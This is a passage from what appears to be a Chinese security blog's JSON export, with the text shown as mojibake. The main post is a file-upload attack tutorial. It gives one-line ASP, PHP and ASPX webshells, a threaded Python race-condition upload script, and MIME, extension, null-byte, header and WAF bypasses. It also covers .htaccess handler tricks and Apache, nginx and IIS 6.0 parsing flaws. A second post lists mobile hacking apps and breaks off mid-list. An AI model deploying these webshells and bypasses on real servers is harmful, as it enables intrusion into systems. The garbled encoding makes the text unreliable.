name=&quot;submit&quot;æ¶“å©ç´¶------WebKitFormBoundary5cOINdf9NfnWclrC-- ç„¶åä¼ åˆ° server.php ä¸­æ—¶ 12345678910111213141516171819202122$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;); $file_name = trim($_FILES['upload_file']['name']);//è¿™é‡Œçš„$_FILESå°±æ˜¯ä¸Šä¼ è¿›æ¥çš„æ–‡ä»¶ï¼ˆ$_FILESæœ¬èº«æ˜¯æ•°ç»„å½¢å¼ï¼‰ï¼Œå‰ä¸€ä¸ª[]æŒ‡å®šæ–‡ä»¶æ˜¯è°ï¼Œåä¸€ä¸ª[]æŒ‡å®šæ•°ç»„å†…å®¹ if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) {//æ–‡ä»¶ä¸Šä¼ æˆåŠŸåä¼šè¢«æ”¾åˆ°ä¸€ä¸ªä¸´æ—¶ç›®å½•ï¼ˆå³$FILES[]['tmp_name']ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ç§»åŠ¨åˆ°æˆ‘ä»¬çœŸæ­£ä¸Šä¼ çš„ç›®å½•ï¼Œä¸ç„¶åœ¨æ­¤phpæ–‡ä»¶è¿è¡Œç»“æŸåä¸Šä¼ çš„æ–‡ä»¶å°†è¢«è‡ªåŠ¨åˆ é™¤ $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; }} å…·ä½“ $_FILES ç”¨æ³•è¯¦è§[[PHPå…¨å±€å˜é‡#$_FILES]]ï¼Œè€Œ $_FILES[][] åä¸€ä¸ªä¸­æ‹¬å·é‡Œçš„æ•°ç»„å†…å®¹å¯ä»¥æ˜¯ï¼š 123456789$_FILES['myFile']['name'] å®¢æˆ·ç«¯æ–‡ä»¶çš„åŸåç§°ã€‚ $_FILES['myFile']['type'] æ–‡ä»¶çš„ MIME ç±»å‹ï¼Œéœ€è¦æµè§ˆå™¨æä¾›è¯¥ä¿¡æ¯çš„æ”¯æŒï¼Œä¾‹å¦‚&quot;image/gif&quot; $_FILES['myFile']['size'] å·²ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚ $_FILES['myFile']['tmp_name'] æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿé»˜è®¤ã€‚å¯ä»¥åœ¨php.iniçš„upload_tmp_dir æŒ‡å®šï¼Œä½† ç”¨ putenv() å‡½æ•°è®¾ç½®æ˜¯ä¸èµ·ä½œç”¨çš„$_FILES['myFile']['error'] å’Œè¯¥æ–‡ä»¶ä¸Šä¼ ç›¸å…³çš„é”™è¯¯ä»£ç ã€‚['error'] æ˜¯åœ¨ PHP 4.2.0 ç‰ˆæœ¬ä¸­å¢åŠ çš„ã€‚ä¸‹é¢æ˜¯å®ƒçš„è¯´æ˜ï¼š(å®ƒä»¬åœ¨PHP3.0ä»¥åæˆäº†å¸¸é‡) æ–‡ä»¶ä¸Šä¼ æŠ€å·§å‚è€ƒ[[ä»PHPä»£ç å±‚é¢åˆ†ææ–‡ä»¶ä¸Šä¼ æ¼æ´]] 0x00.Tips ä¸€å¥è¯ 123456789* aspä¸€å¥è¯æœ¨é©¬ï¼š &lt;%execute(request(&quot;value&quot;))%&gt; * phpä¸€å¥è¯æœ¨é©¬ï¼š &lt;?php @eval($_POST[haha]);?&gt; * aspxä¸€å¥è¯æœ¨é©¬ï¼š &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;value&quot;])%&gt; æ–‡ä»¶ä¸Šä¼ æœ‰å¯èƒ½æ˜¯é€šè¿‡ js æ§åˆ¶çš„ï¼Œè¦ä¸ç¦ç”¨ jsï¼Œè¦ä¸åˆ é™¤ js çš„ç›¸å…³é™åˆ¶å‡½æ•° ä¼ å…¥çš„ä¸€å¥è¯å¯ä»¥åœ¨æµè§ˆå™¨å†…ç›´æ¥ post php å‡½æ•°åï¼Œæ¯”å¦‚ï¼š 123phpinfo();system('ipconfig')æˆ–è€…åœ¨å‰é¢åŠ ä¸Šecho('&lt;pre&gt;');æ¥ä½¿è¾“å‡ºçš„æ–‡ä»¶å˜å¾—è§„æ•´ æœ¬åœ°éªŒè¯å¯ä»¥æ ¹æ®ä¸Šä¼ åçš„éªŒè¯é€Ÿåº¦åˆæ­¥åˆ¤æ–­æ˜¯ä¸æ˜¯æœ¬åœ°éªŒè¯ï¼Œæœ‰å¯èƒ½ä¼šæœ‰ï¼š 1onsubmit=&quot;return checkFile()&quot;//åˆ æ‰å°±å¥½ ä¹Ÿæœ‰å¯èƒ½æ˜¯ js é™åˆ¶ï¼Œä¸è¿‡å¦‚æœè¿˜æ˜¯å‰ç«¯çš„è¯ï¼Œæ”¹ä¸€ä¸‹å°±å¥½ æ–‡ä»¶ç±»å‹éªŒè¯ å¦‚æœè¯´æœåŠ¡å™¨æ£€æŸ¥çš„æ˜¯æ–‡ä»¶çš„ç±»å‹ MIMEï¼Œé‚£ä¹ˆå¯ä»¥æ›´æ”¹ç›¸åº”çš„ç±»å‹æ¥è¾¾åˆ°ä¼ªé€ ä¸Šä¼ çš„æ•ˆæœï¼Œä¾‹å¦‚ï¼š 1234phpä¸Šä¼ åé»˜è®¤æ˜¯ï¼štext/plainæˆ‘ä»¬å¯ä»¥æ›´æ”¹ä¸ºimage/jpegï¼ˆè¿™ä¸ªå…·ä½“æ˜¯ä»€ä¹ˆè§†æƒ…å†µè€Œå®šï¼‰ å¶å°”å¯ä»¥å°è¯•å°†.php å…ˆæ”¹ä¸º.jpgï¼Œå†åœ¨ burp çš„æŠ“åŒ…é‡Œæ”¹å›æ¥ æ–‡ä»¶åç¼€åéªŒè¯å¯ä»¥æ›´æ”¹æ–‡ä»¶çš„åç¼€åæ¥ç»•è¿‡é»‘åå•ï¼Œä¾‹å¦‚ï¼šphp åˆ«å 123456.php2.php3.php4.phps.pht.phtml å¯¹å›¾ç‰‡å†…å®¹ç»™è¿›è¡ŒéªŒè¯å°±æ˜¯å›¾ç‰‡é©¬å¦‚æœæ²¡å¯¹å›¾ç‰‡åç¼€è¿›è¡ŒéªŒè¯ï¼Œé‚£ä¹ˆæ”¹åç¼€ä¸º php å³å¯ã€‚ä½†æ˜¯å¦‚æœå¯¹åç¼€è¿›è¡Œäº†éªŒè¯ï¼Œæˆ‘ä»¬å°±å¿…é¡»ä¸Šä¼ å›¾ç‰‡åç¼€æ–‡ä»¶ï¼ŒåŒæ—¶é‡Œè¾¹åŠ ä¸Š shell ä»£ç ã€‚ ç©ºå­—èŠ‚æˆªæ–­å¦‚æœæŠ“åŒ…ä¸­æœ‰æ˜¾ç¤ºæ–‡ä»¶ä¸Šä¼ çš„ç›¸å¯¹è·¯å¾„åå­—ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•åœ¨è·¯å¾„åé¢åšå‡ºæ”¹å˜ï¼Œä¾‹å¦‚ï¼š 1231.php+ç©ºæ ¼+1.jpgåŠï¼š1.php 1.jpgç„¶ååœ¨HEXåå…­è¿›åˆ¶çš„é¡µé¢ï¼Œå°†è‡ªå·±çš„ç©ºæ ¼ï¼ˆ20ï¼‰æ”¹ä¸º00ï¼Œå†å›å»çœ‹é‚£ä¸ªåœ°æ–¹ç©ºæ ¼ä¼šå˜æˆä¸€ä¸ªå°ç™½æ–¹æ ¼ ä¸Šä¼ çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨å¿½ç•¥.jpg æœåŠ¡ç«¯æ£€æµ‹æ–‡ä»¶å†…å®¹å¦‚æœåªæ ¡éªŒ php/asp ç­‰åç¼€åå†…å®¹æ˜¯ä¸æ˜¯æœ¨é©¬æˆ‘ä»¬å¯ä»¥é€šè¿‡å…ˆå»ä¸Šä¼ ä¸€ä¸ªå«æœ‰æœ¨é©¬çš„ txt æ–‡ä»¶ç„¶åå†ä¸Šä¼ ä¸€ä¸ªæœ‰[[æ–‡ä»¶åŒ…å«æ¼æ´]]æ“ä½œçš„æ— å®³ php æ–‡ä»¶ï¼Œ 12345678#PHP &lt;?php Include(&quot;ä¸Šä¼ çš„txtæ–‡ä»¶è·¯å¾„&quot;);?&gt; #ASP &lt;!--#include file=&quot;ä¸Šä¼ çš„txtæ–‡ä»¶è·¯å¾„&quot; --&gt;#JSP &lt;jsp:inclde page=&quot;ä¸Šä¼ çš„txtæ–‡ä»¶è·¯å¾„&quot;/&gt;or &lt;%@include file=&quot;ä¸Šä¼ çš„txtæ–‡ä»¶è·¯å¾„&quot;%&gt; æœåŠ¡ç«¯æ£€æµ‹æ–‡ä»¶å¤´123PNGï¼š æ–‡ä»¶å¤´æ ‡è¯† (8 bytes) 89 50 4E 47 0D 0A 1A 0AJPEGï¼š æ–‡ä»¶å¤´æ ‡è¯† (2 bytes): 0xff, 0xd8 (SOI) (JPEG æ–‡ä»¶æ ‡è¯†)GIFï¼š æ–‡ä»¶å¤´æ ‡è¯† (6 bytes) 47 49 46 38 39(37) 61 åœ¨æœ¨é©¬å‰åŠ ä¸Šæ–‡ä»¶ç›¸å…³æ–‡ä»¶å¤´å°±å¥½äº†ä¾‹å¦‚ 12GIF89a&lt;?php phpinfo(); ?&gt; æ¡ä»¶ç«äº‰ä¸Šä¼ ä¸Šä¼ çš„è„šæœ¬ç»•è¿‡äº†è¿‡æ»¤ï¼Œä½†æ˜¯åœ¨é‚£è¾¹ä¼šè¢«æŸ¥æ€åˆ é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åŸç†ï¼šå†™ä¸€ä¸ªè„šæœ¬ï¼Œä½¿ç”¨ä¸€ä¸ªå¤šå¹¶å‘çº¿ç¨‹å‘é€ shellï¼ŒåŒæ—¶æ—¶åˆ»è®¿é—®é‚£ä¸ª shellï¼Œæ€»æœ‰ä¸€ä¸ªä¼šè¿æ¥ä¸Šè„šæœ¬ç¤ºä¾‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940import osimport requestsimport threadingclass RaceCondition(threading.Thread): def __init__(self): threading.Thread.__init__(self) self.url = &quot;http://127.0.0.1:8080/upload/shell0.php&quot; self.uploadUrl = &quot;http://127.0.0.1:8080/upload/copy.php&quot; def _get(self): print('try to call uploaded file...') r = requests.get(self.url) if r.status_code == 200: print(&quot;[*]create file info.php success&quot;) os._exit(0) def _upload(self): print(&quot;upload file.....&quot;) file = {&quot;file&quot;:open(&quot;shell0.php&quot;,&quot;r&quot;)} requests.post(self.uploadUrl, files=file) def run(self): while True: for i in range(5): self._get() for i in range(10): self._upload() self._get()if __name__ == &quot;__main__&quot;: threads = 20 for i in range(threads): t = RaceCondition() t.start() for i in range(threads): t.join() WAF éªšæ“ä½œç»•è¿‡ åˆ é™¤ Content-Disposition ä¸ form-data ä¸­é—´é»˜è®¤æœ‰çš„ç©ºæ ¼ æ›´æ”¹ Content-Disposition å­—ç¬¦ä¸­çš„å¤§å°å†™ ç‰¹æ®Šçš„é•¿æ–‡ä»¶åç»•è¿‡ 1shell.asp;ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹ç‹.jpg æœ‰äº› WAF çš„è§„åˆ™æ˜¯ï¼šå¦‚æœæ•°æ®åŒ…ä¸º POST ç±»å‹ï¼Œåˆ™æ ¡éªŒæ•°æ®åŒ…å†…å®¹ã€‚ æ­¤ç§æƒ…å†µå¯ä»¥ä¸Šä¼ ä¸€ä¸ª POST å‹çš„æ•°æ®åŒ…ï¼ŒæŠ“åŒ…å°† POST æ”¹ä¸º GETã€‚ åˆ©ç”¨ WAF æœ¬èº«çš„ç¼ºé™·ï¼š ç›´æ¥åˆ é™¤ Content-Type æ•´è¡Œåˆ é™¤æ‰ ontent-Type: image/jpeg åªç•™ä¸‹ cï¼Œå°†.php åŠ  c åé¢å³å¯ï¼Œä½†æ˜¯è¦æ³¨æ„é¢ï¼ŒåŒå¼•å·è¦è·Ÿç€ c.php 123æ­£å¸¸åŒ…ï¼šContent-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/pngæ„é€ åŒ…ï¼šContent-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.pngC.php&quot; åœ¨æ–‡ä»¶å†…å®¹å¡«åƒåœ¾æ•°æ®ï¼Œç»•è¿‡å†…å®¹æ£€éªŒ åœ¨æ–‡ä»¶å¤´å¡«åƒåœ¾æ•°æ®ï¼Œç»•è¿‡æ–‡ä»¶åæ£€éªŒ Content-Disposition å‚æ•°åé¢å»åŠ åƒåœ¾æ•°æ®ï¼Œå¯¼è‡´ waf å‡ºé”™ Content-Disposition åœ¨è¯·æ±‚å¤´ä¸­æ—¶ é€šå¸¸å­˜åœ¨äº multipart/form-data è¯·æ±‚ä½“ä¸­ 1Content-Disposition: form-data; name=&quot;fieldName&quot;; filename=&quot;filename.jpg&quot; //ç¬¬ä¸€ä¸ªå‚æ•°æ’å®šä¸ºform-data ï¼Œåä¸¤ä¸ªåˆ†åˆ«æ˜¯è¡¨å•é¡¹åä¸ä¸Šä¼ çš„æ–‡ä»¶å åœ¨å“åº”å¤´æ—¶ï¼Œè¡¨ç¤ºé¡µé¢ä»¥ä»€ä¹ˆå½¢å¼å‘ˆç° æ˜¯å‚æ•°inline æ—¶ï¼Œä»¥é¡µé¢æˆ–é¡µé¢çš„ä¸€éƒ¨åˆ†æ¸²æŸ“å‘ˆç°æ˜¯å‚æ•°attachmentæ—¶ï¼Œå°†é¡µé¢ä½œä¸ºæ–‡ä»¶ä¸‹è½½ 123456// æ­£å¸¸è§£ææ¸²æŸ“Content-Disposition: inline// ä¸‹è½½æ–‡ä»¶Content-Disposition: attachment// ä¸‹è½½æ–‡ä»¶ï¼Œå¹¶å°†æ–‡ä»¶ä¿å­˜ä¸ºfilename.jpgContent-Disposition: attachment; filename=&quot;filename.jpg&quot; 0x01.Apacheå½“æ–‡ä»¶ä¸Šä¼ è¿‡å»çš„æ—¶å€™ï¼ŒApache ä»å³å‘å·¦å¯¹æ–‡ä»¶åè¿›è¡Œè§£æ åˆ©ç”¨ Apache ä»å³å‘å·¦çš„è§£æä¹ æƒ¯ ä¸Šä¼  1.php.bak æˆ–è€…ä»»æ„ä¸€ä¸ªç¼–é€ çš„åç¼€åœ¨æŸäº›ç‰ˆæœ¬å¯å½“åš php æ¥æ‰§è¡Œï¼ˆå› ä¸º apache ä»å³åˆ°å·¦å¯¹æ–‡ä»¶åè¿›è¡Œè§£æï¼Œè€Œ .bak æ˜¯ httpd.conf è¯†åˆ«ä¸äº†çš„æ–‡ä»¶ååç¼€ï¼Œæ•… apache ä¼šè‡ªåŠ¨æå–å·¦è¾¹çš„.phpï¼‰ é€šè¿‡æ„é€ å½“å‰ç½‘é¡µé…ç½®æ–‡ä»¶.htaccess åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸º.htaccess çš„æ–‡ä»¶ï¼Œä¿å­˜æ ¼å¼ä¸º eXtensible Markup Language fileå†…å®¹ä¸ºï¼š 123456&lt;FilesMatch &quot;cimer&quot;&gt; //cimerå¯ä»¥æ›¿æ¢ä¸ºè‡ªå·±æƒ³è¦çš„åç¼€åï¼ŒåæœŸæ”¹è¿™ä¸ªåç¼€åä¸Šä¼ å°±å¥½äº†SetHandler application/x-httpd-php&lt;/FilesMatch&gt;å°†.htaccessä¸Šä¼ åˆ°æŒ‡å®šé¡µé¢ä¸­ï¼ˆå®ƒæ˜¯é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥ä¸ä¼šè¢«æ‹¦æˆªï¼‰ï¼Œç„¶åå°†è‡ªå·±çš„.phpä»£ç æ›´æ”¹åç¼€åä¸º.cimerï¼ˆè‡ªå·±èµ·çš„é‚£ä¸ªï¼‰ä¸Šä¼  èœåˆ€è¿æ¥æ—¶åŒæ ·è®¿é—®è¿™ä¸ª****.cimerå°±å¥½ã€‚ 0x02.nginx ä¸Šä¼ äº†ä¸ª 1.jpgï¼ˆè¿™é‡Œä¸æ˜¯å›¾ç‰‡é©¬ï¼‰ åªè¦è®¿é—® www.hahaha.com/upload/1.jpg/1.php ä¾¿å¯ä»¥æ‰§è¡Œ php ä»£ç  ä¸€èˆ¬æ–‡ä»¶ä¸Šä¼ æ˜¯ä¸éœ€è¦å›¾ç‰‡é©¬çš„ï¼Œæ­£å¸¸ä¸Šä¼ æ”¹åç¼€ï¼Œè§£æå•¥çš„å³å¯ã€‚ 12345åªæœ‰å½“æœ‰å‡½æ•°getimagesize()ä½œè¿‡æ»¤çš„æ—¶å€™ï¼ˆä¼šæ£€æŸ¥æ–‡ä»¶å¤´ï¼Œå›¾ç‰‡çš„é•¿å®½ç­‰ï¼‰ï¼Œæ‰éœ€è¦ä½¿ç”¨å›¾ç‰‡é©¬ã€‚å›¾ç‰‡é©¬å¯ä»¥é€šè¿‡cmdä¸­copyæ¥åˆ¶ä½œ ï¼Œå‡è®¾å›¾ç‰‡æ˜¯1.jpg,é©¬æ˜¯2.phpï¼Œæœ€åç”Ÿæˆ3.jpgcopy 1.jpg/a+2.php/b 3.jpg æœ€åéœ€è¦å°†æ–‡ä»¶åæ”¹ä¸º 3.jpg.phpï¼Œæ‰å¯ä»¥è¿æ¥èœåˆ€ã€‚ 0x03.IIS6.0IIS6.0 çš„è§£ææ¼æ´ éšä¾¿ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œæ›´æ”¹åŒ…å†…ä¸Šä¼ æ–‡ä»¶ä¿å­˜çš„åœ°å€ï¼Œå¢åŠ ä¸€ä¸ª 1.asp/ï¼Œæ¯”æ–¹è¯´ 12345åŒ…å†…æ˜¾ç¤ºåŸä¸Šä¼ è·¯å¾„ä¸º:upload/è¿™æ—¶éœ€è¦æ›´æ”¹ä¸ºï¼šupload/1.asp/ æˆ–è€…1.phpè¿™æ ·é‚£ä¸ªå›¾ç‰‡æ–‡ä»¶å°±ä¼šé»˜è®¤ä¿å­˜åœ¨1.asp/åè¾¹çš„ç›®å½•äº†ï¼Œè®°å½•ä¸‹ä¸Šä¼ åçš„æ–‡ä»¶å ç„¶åèœåˆ€åœ°å€é‡Œå°±å†™ï¼š...../upload/1.asp/haha.jpgï¼Œè¾“å…¥å¯†ç å³å¯è¿æ¥ è¿™æ—¶å€™ IIS å°±ä¼šè‡ªåŠ¨å¿½ç•¥ä¸è§£æ/haha.jpg è¿™æ®µå†…å®¹ï¼Œç›´åˆ° 1.asp å°±åœæ­¢äº† éšä¾¿ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œä»ç„¶æ˜¯æ›´æ”¹åŒ…ä¸­çš„è·¯å¾„ï¼Œä½†è¿™æ¬¡åˆ©ç”¨åˆ†å· 123456åŒ…å†…æ˜¾ç¤ºåŸä¸Šä¼ è·¯å¾„ä¸º:upload/è¿™æ—¶éœ€è¦æ›´æ”¹ä¸ºï¼šupload/1.aspï¼› //æ³¨æ„ï¼šæ–‡ä»¶åé‚£é‡Œä¸èƒ½åŠ¨ï¼Œå› ä¸ºå³ä¾¿æ–‡ä»¶åæ”¹ä¸º1.asp;1.jpgï¼Œä¸Šä¼ åæ„é€ çš„1.asp;å…¨éƒ¨ä¼šè¢«æ›¿æ¢æ‰ ä¸Šä¼ å®Œåï¼Œä¸Šä¼ çš„å›¾ç‰‡ï¼ˆå…¶å®æ²¡æœ‰ï¼‰å’Œ1.aspéƒ½æ˜¯åŒåœ¨uploadæ–‡ä»¶å¤¹ä¸‹é¢çš„ æ‰€ä»¥èœåˆ€çš„è¿æ¥åœ°å€ä¸ºï¼šupload/1.asp;1.jpg ç³»ç»Ÿä¼šè®¤ä¸ºåˆ†å·æ˜¯ä¸€ä¸ªå†…å­˜æ–­ç‚¹","link":"/2020/08/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"title":"ä¸€ä¸ªé»‘å®¢èƒ½ç”¨ä¸€å°æ‰‹æœºåšåˆ°ä»€ä¹ˆäº‹æƒ…","text":"ã€Šçœ‹é—¨ç‹—2ã€‹é‡Œé»‘å®¢Marcusè§åˆ°è‡ªå·±å¶åƒT-boneè®²åˆ°ï¼š æˆ‘çœ‹ç€ä½ æ›¾ç»â€æˆ˜äº‰é©¾é©¶â€œï¼Œå¹¶å› æ­¤æ”¹è£…äº†æˆ‘çš„åæ®µå˜é€Ÿè„šè¸è½¦ï¼Œç„¶ååœ¨èƒŒåŒ…ä¸ŠåŠ è£…å¤©çº¿ æˆ˜äº‰é©¾é©¶ï¼ˆWarDrivingï¼‰å°±æ˜¯æŒ‡ä½¿ç”¨ç›¸åº”çš„ç¡¬ä»¶å’Œè½¯ä»¶æ‰“é€ çš„æ— çº¿å±€åŸŸç½‘ä¾¦å¯Ÿå¹³å°ï¼Œé€šè¿‡å¾’æ­¥æˆ–åˆ©ç”¨ç›¸åº”äº¤é€šå·¥å…·çš„æ–¹å¼åœ¨å„ä¸ªåŸé•‡çš„æ¯ä¸ªè¡—é“å¯»æ‰¾ä¸è®¾é˜²çš„æ— çº¿è®¿é—®ç‚¹(AP)çš„ä¸€ç§ç»Ÿç§°ã€‚ è€Œå®ƒçš„å­˜åœ¨ï¼Œä¾¿æ˜¯é»‘å®¢å¯¹â€ä¾¿æºæ€§â€œè¿™ä¸ªéœ€æ±‚çš„æœ€å¤§è¯æ˜ è¿™ä¹ˆäº›å¹´ä¹ŸæŠ˜è…¾è¿‡ä¸å°‘å®‰å…¨ç›¸å…³APPï¼Œåœ¨è¿™é‡Œå¤§è‡´æ±‡æ€»äº†ä¸‹ï¼Œå¹¶ä»è½¯ä»¶ã€å·¥å…·è§’åº¦å‡ºå‘ï¼Œå¸¦ä½ äº†è§£é»‘å®¢èƒ½ç”¨ä¸€éƒ¨æ‰‹æœºåšäº›ä»€ä¹ˆã€‚ ä¸‹é¢æ˜¯æ­£æ–‡ï¼šå…ˆè®²è®²å’Œé»‘å®¢ç›´æ¥ç›¸å…³çš„ 0x00.é’ˆå¯¹ä¸ä¹æ„æŠ˜è…¾çš„äººç»ˆç«¯ä¸è¿æ¥ç±» JuiceSSH ConnectBot ç»ˆç«¯æ¨¡æ‹Ÿå™¨ Termux VNC Viewer ç¼–ç¨‹ç±» Qpython 3/OLï¼ˆpythonå®‰å“ç«¯ç¼–ç¨‹appï¼ŒæŒºå¤šç‰ˆæœ¬ï¼Œçœ‹éœ€æ±‚ï¼‰ C4droid ï¼ˆå®‰å“ç«¯ç¼–å†™Cè¯­è¨€çš„appï¼‰ AIDE Web ï¼ˆç¼–å†™webç›¸å…³è¯­è¨€ï¼‰ å„ç§å‚å•†è·¯ç”±å™¨ã€æœåŠ¡å™¨app TP-LINK å¤©ç¿¼ç½‘å…³ã€å¤©ç¿¼äº‘ç”µè„‘ï¼ˆæ”¾åœ¨è¿™é‡Œè¯´ï¼Œå› ä¸ºå‰æ®µæ—¶é—´åœ¨å¤©ç¿¼äº‘ç™½å«–æœåŠ¡å™¨å®åœ¨å¤ªé¦™äº†ï¼‰ â€¦ å…¶ä½™ç±» ESæ–‡ä»¶æµè§ˆå™¨ ï¼ˆæ²¡rootçš„é¦–é€‰ï¼Œç°åœ¨å¹¿å‘Šæœ‰ç‚¹çƒ¦äººï¼Œä¸è¿‡ä¹ŸåŠæ‰“é‚£äº›æ‰‹æœºè‡ªå¸¦çš„ï¼‰ IP Tools ï¼ˆä¸€æ¬¾ä¸ªäººæ¯”è¾ƒå–œæ¬¢çš„æŸ¥å±€åŸŸç½‘ipä¿¡æ¯ç›¸å…³å·¥å…·ï¼‰ Tasker ï¼ˆä¸€æ¬¾è®©ä½ æ‰‹æœºè‡ªåŠ¨åŒ–èµ·æ¥çš„è½¯ä»¶ï¼Œç”¨å¾—å¥½æ˜¯ç¥å™¨ï¼Œä¸è¿‡å¾—èŠ±ç²¾åŠ›å­¦ä¹ ç”¨æ³•ï¼‰ Packet Capture ï¼ˆç»å…¸æ‰‹æœºæŠ“åŒ…è½¯ä»¶ï¼Œä¸ä¼šåœ¨ç”µè„‘ä¸Šæburpä»£ç†çš„è¯è¿˜æ˜¯è›®æ–¹ä¾¿çš„ï¼‰ Github/Openhub/Coding ï¼ˆå„ç§ä»£ç æ‰˜ç®¡ç½‘ç«™çš„æ‰‹æœºç‰ˆappï¼‰ 0x01.é’ˆå¯¹ä¹æ„æŠ˜è…¾çš„äººè¯´å®è¯ï¼Œâ€œé»‘å®¢ç²¾ç¥â€æ€ä¼šå«Œéº»çƒ¦ï¼Œä¸æŠ˜è…¾çš„è¯å¾ˆå¤šåŠç‚¸å¤©çš„åŠŸèƒ½ä½ æ˜¯å¼€å‘ä¸å‡ºæ¥çš„è¿™é‡Œçš„æŠ˜è…¾ç‰¹æŒ‡ï¼šæRootã€åˆ·æœºã€adbæ“ä½œï¼Œç†¬å¤œï¼ˆæ»‘ç¨½ï¼‰â€¦ ä¸€èˆ¬è½¯ä»¶ç±» Shadowsocks/Shadowsocks Rã€å„ç§VPN ï¼ˆç§‘å­¦ä¸Šç½‘ï¼Œä¸å¤šæ¯”æ¯”ï¼‰ cSploit/dSploit ï¼ˆè´¼ç‰›é€¼çš„ä¸€ä¸ªå±€åŸŸç½‘æ”»å‡»ç¥å™¨ï¼‰ zANTI ï¼ˆåŒä¸Šï¼Œä½†æ˜¯å¬è¯´åŠ¨é™è¾ƒå¤§ï¼Œæ‰€ä»¥æˆ‘åŸºæœ¬è¿˜æ˜¯ç”¨ä¸Šé¢é‚£ä¸ªï¼‰ MTç®¡ç†å™¨ã€Root Explorer ï¼ˆä¸ªäººç”¨REè¾ƒå¤šï¼Œæ–‡ä»¶ç®¡ç†ç¥å™¨ï¼ŒåŠæ‰“ESï¼‰ Shodan ï¼ˆå¼ºå¤§çš„è”ç½‘è®¾å¤‡æœç´¢å¼•æ“ï¼Œå…¶åŠŸèƒ½å‚ç…§ï¼šZoomeyeã€Fofaç­‰ï¼‰ Hackerâ€™s Keyboard ï¼ˆå¦‚æœä¸å¤–æ¥é”®ç›˜ï¼Œè¿™ä¸ªé”®ç›˜è½¯ä»¶ç»å¯¹æ˜¯æˆ‘çš„å¿ƒæ°´ï¼Œå› ä¸ºå®ƒä¼˜åŒ–äº†ç•Œé¢ï¼Œæ›´å®¹æ˜“è¾“å…¥é‚£äº›æå®‰å…¨éœ€è¦ç”¨åˆ°çš„å­—ç¬¦ï¼‰ RF Analyzer ï¼ˆNethunerè‡ªå¸¦ï¼Œæ— çº¿å°„é¢‘åˆ†æç›¸å…³ï¼Œæˆ‘æ²¡æ€ä¹ˆç”¨è¿‡ï¼Œæ¯•ç«Ÿ360çš„Hackcubeå•¥çš„éƒ½æœ‰è‡ªå®¶çš„è½¯ä»¶ã€‚ã€‚ã€‚ï¼‰ Nethunter VNC ï¼ˆNethunterè‡ªå¸¦ï¼Œä¸è¿‡æˆ‘çš„ç‰ˆæœ¬è€æŠ¥é”™ï¼Œæ‰€ä»¥è‡ªå·±è¿˜æ˜¯ä½¿ç”¨ VNC Viewerè¾ƒå¤šï¼‰ Tor ï¼ˆé¦–å…ˆéœ€è¦ç§‘å­¦ä¸Šç½‘ï¼Œç„¶åä½ ä¾¿å¯ä»¥é€šè¿‡è¿™ä¸ªå…¨çƒä»£ç†è½¯ä»¶éšè”½çš„è¿›å…¥æš—ç½‘äº†ï¼‰ å…¶ä»–æŸäº›è½¯ä»¶è‡ªæˆ‘æ„Ÿè§‰è›®èŠ±é‡Œèƒ¡å“¨ï¼Œå®é™…æ¸—é€ä¸­å…¶å®æ¯”è¾ƒå±€é™ï¼Œæˆ‘å¹³å¸¸ä¸å¤ªç”¨ï¼Œè¿™é‡Œæ”¾ä¸‹ ï¼ˆé‡å¤´æˆï¼‰æ¡†æ¶ç±» é¦–å…ˆç¥­ä¸Šæœ€ç‰›é€¼çš„Kali Nethunter ï¼ï¼ï¼å…³äºå¦‚ä½•åˆ·Kali Nethunteråœ¨è¿™é‡Œæ”¾ä¸¤ä¸ªæ•™ç¨‹ï¼š ã€æ•™ç¨‹ã€‘æ€ä¹ˆæˆä¸ºä¸€åâ€œé»‘æ‰‹å…šâ€ èŠèŠé»‘å®¢æ‰‹æœº 3.0 ï¼ˆä½™å¼¦å¤§å¤§çš„æ–‡ç« ï¼‰ åšé»‘å®¢ä¸çŸ¥é“kaliæ€ä¹ˆè¡Œï¼Œæœ‰å¥è€è¯ï¼škaliå­¦å¾—å¥½ï¼Œç‰¢é¥­åƒå¾—æ—©ï¼ˆå¤§é›¾ï¼‰ é¦–å…ˆï¼Œä½ å¯ä»¥åœ¨ç»ˆç«¯ä½¿ç”¨ç»å¤§éƒ¨åˆ†kaliè½¯ä»¶ï¼Œå¦‚ä¸‹ï¼š Metasploit 